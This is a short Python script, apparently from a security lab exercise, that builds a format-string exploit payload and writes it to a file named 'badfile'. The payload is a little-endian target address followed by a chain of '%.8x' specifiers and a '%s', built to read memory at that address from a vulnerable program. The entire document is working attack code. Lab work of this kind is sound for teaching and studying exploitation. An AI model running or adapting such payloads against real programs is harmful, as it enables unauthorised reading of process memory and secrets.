#!/usr/bin/python3
import sys


N = 1500
content = bytearray(0x0 for i in range(N))

number = 0x080b4008
content[0:4] = (number).to_bytes(4, byteorder='little')

s = "%.8x--" * 31 + '%s' + "\n"
fmt = (s).encode('latin-1')
content[4:4 + len(fmt)] = fmt

file = open("badfile", "wb")
file.write(content)
file.close()